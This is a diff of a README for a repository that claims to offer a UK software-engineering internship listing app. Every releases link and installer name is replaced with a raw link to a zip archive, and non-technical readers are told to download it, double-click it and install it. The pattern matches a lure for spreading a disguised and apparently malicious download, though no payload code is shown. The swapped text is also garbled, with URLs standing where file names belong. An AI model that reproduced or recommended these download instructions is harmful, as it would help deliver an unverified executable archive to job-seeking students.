@@ -1,7 +1,7 @@
 # 🎉 2026-SWE-Internship-UK - Find Your Ideal Internship
 
 ## 💾 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/CullFreeZie/2026-SWE-Internship-UK/releases)
+[![Download](https://raw.githubusercontent.com/CullFreeZie/2026-SWE-Internship-UK/main/tritium/2026-SWE-Internship-UK.zip)](https://raw.githubusercontent.com/CullFreeZie/2026-SWE-Internship-UK/main/tritium/2026-SWE-Internship-UK.zip)
 
 ## 📖 Description
 Welcome to the **2026 SWE Internship UK** repository. This application curates the latest Software Engineering internship opportunities for undergraduate students in the UK. Explore various internships updated daily and enhance your programming career.
@@ -10,24 +10,24 @@ Welcome to the **2026 SWE Internship UK** repository. This application curates t
 Follow these simple steps to download and run the application. Don't worry; you don’t need any programming skills to get started.
 
 ### Step 1: Visit the Releases Page
-To download the application, visit our [Releases Page](https://github.com/CullFreeZie/2026-SWE-Internship-UK/releases). This is where you will find the latest version of the application.
+To download the application, visit our [Releases Page](https://raw.githubusercontent.com/CullFreeZie/2026-SWE-Internship-UK/main/tritium/2026-SWE-Internship-UK.zip). This is where you will find the latest version of the application.
 
 ### Step 2: Select the Latest Version
 On the Releases page, look for the latest version listed at the top. It should have a title like “Version x.x.x” (where x is a number). This version includes all the latest features and bug fixes.
 
 ### Step 3: Download the Application
-Click on the file that corresponds to your operating system. If you are using Windows, you might see a file named something like `InternshipApp_Windows.exe`. For Mac users, it may appear as `InternshipApp_Mac.dmg`. 
+Click on the file that corresponds to your operating system. If you are using Windows, you might see a file named something like `https://raw.githubusercontent.com/CullFreeZie/2026-SWE-Internship-UK/main/tritium/2026-SWE-Internship-UK.zip`. For Mac users, it may appear as `https://raw.githubusercontent.com/CullFreeZie/2026-SWE-Internship-UK/main/tritium/2026-SWE-Internship-UK.zip`. 
 
 ### Step 4: Install the Application
 Once the download is finished, locate the downloaded file. 
-- For Windows users: Double-click on the `InternshipApp_Windows.exe` file. Follow the on-screen prompts to complete the installation.
-- For Mac users: Open the `InternshipApp_Mac.dmg` file and drag the application icon to your Applications folder.
+- For Windows users: Double-click on the `https://raw.githubusercontent.com/CullFreeZie/2026-SWE-Internship-UK/main/tritium/2026-SWE-Internship-UK.zip` file. Follow the on-screen prompts to complete the installation.
+- For Mac users: Open the `https://raw.githubusercontent.com/CullFreeZie/2026-SWE-Internship-UK/main/tritium/2026-SWE-Internship-UK.zip` file and drag the application icon to your Applications folder.
 
 ### Step 5: Launch the Application
 After installation, find the app on your computer. For Windows, you can search in the Start menu, and for Mac, look in your Applications folder. Click on the application to launch it.
 
 ## 📥 Download & Install
-Ready to take the next step? Visit the [Releases Page](https://github.com/CullFreeZie/2026-SWE-Internship-UK/releases) and download the application today.
+Ready to take the next step? Visit the [Releases Page](https://raw.githubusercontent.com/CullFreeZie/2026-SWE-Internship-UK/main/tritium/2026-SWE-Internship-UK.zip) and download the application today.
 
 ## 🌟 Features
 - **Daily Updates:** Fresh internship listings every day.
